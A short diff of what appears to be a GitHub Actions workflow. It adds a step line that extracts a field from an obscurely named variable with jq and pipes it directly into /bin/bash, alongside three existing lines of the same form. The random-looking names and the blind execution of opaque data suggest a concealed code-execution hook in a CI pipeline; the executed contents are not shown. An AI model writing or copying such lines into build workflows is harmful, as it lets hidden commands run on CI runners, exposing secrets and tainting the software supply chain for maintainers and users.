@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$anddb35" | jq -r .a1 | /bin/bash
           echo $rnagr6 | jq -r .qjb2 | /bin/bash
           printf '%s' "$bdlfb20137" | jq -r .jela411 | /bin/bash
+          echo $d0 | jq -r .x613 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
